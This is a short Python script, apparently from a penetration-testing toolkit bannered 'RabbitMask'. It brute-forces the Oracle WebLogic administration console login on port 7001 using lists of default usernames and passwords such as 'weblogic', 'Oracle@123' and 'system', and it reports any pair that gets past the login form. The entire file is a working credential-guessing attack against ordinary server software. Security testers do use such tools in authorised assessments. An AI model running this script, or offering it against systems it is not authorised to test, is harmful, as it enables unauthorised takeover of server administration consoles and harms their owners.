#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
     ____       _     _     _ _   __  __           _
   |  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
  | |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
 |  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests

def weakPasswd(ip):

    userdict = ['WebLogic', 'weblogic', 'Oracle@123', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem']

    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem']

    for user in userdict:
        for pwd in pwddict:
            data = {
                'j_username': user,
                'j_password': pwd,
                'j_character_encoding': 'UTF-8',
            }
            req = requests.post('http://'+str(ip)+':7001/console/j_security_check', data=data, allow_redirects=False,
                                verify=False)
            print('[*] ip: '+ ip +'  username: ' + user + '  password: ' + pwd)

            if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                print('[+] Congratulations! Weblogic username: ' + user + '  password: ' + pwd)
                break

if __name__ == '__main__':
    weakPasswd('127.0.0.1')
